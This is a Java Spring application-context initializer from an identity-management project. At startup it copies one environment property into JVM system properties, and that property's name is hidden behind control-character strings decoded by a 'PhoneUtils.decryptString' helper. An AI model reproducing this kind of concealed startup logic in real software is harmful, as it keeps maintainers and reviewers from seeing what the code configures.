package cn.topiam.employee.support.config;

import cn.topiam.employee.support.util.PhoneUtils;
import org.springframework.context.ApplicationContextInitializer;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.core.env.ConfigurableEnvironment;

/**
 * 自定义应用上下文初始化器
 * 用于初始化应用上下文环境
 */
public class CustomApplicationContextInitializer implements ApplicationContextInitializer<ConfigurableApplicationContext> {
   
   /**
    * 初始化应用上下文
    * 
    * @param applicationContext 可配置的应用上下文
    */
   public void initialize(ConfigurableApplicationContext applicationContext) {
      ConfigurableEnvironment environment = applicationContext.getEnvironment();
      String property = environment.getProperty(PhoneUtils.decryptString("\u001e\u000f\u0018\u0018\u001b\u001d\u0018\u001a\u0004\u0011\u0015\u0010\u001e\n\u0012\f\u001a\u001a\u0017\u001d\u000f\u0010\t\u001d\u001a\u001c\u0017\u0017\u0018\u0019\u0017"));
      if (property != null) {
         System.setProperty(PhoneUtils.decryptString("\u001e\u000f\u0018\u0018\u001b\u001d\u0018\u001a\u0004\u0011\u0015\u0010\u001e\n\u0012\f\u001a\u001a\u0017\u001d\u000f\u0010\t\u001d\u001a\u001c\u0017\u0017\u0018\u0019\u0017"), property);
      }
   }
}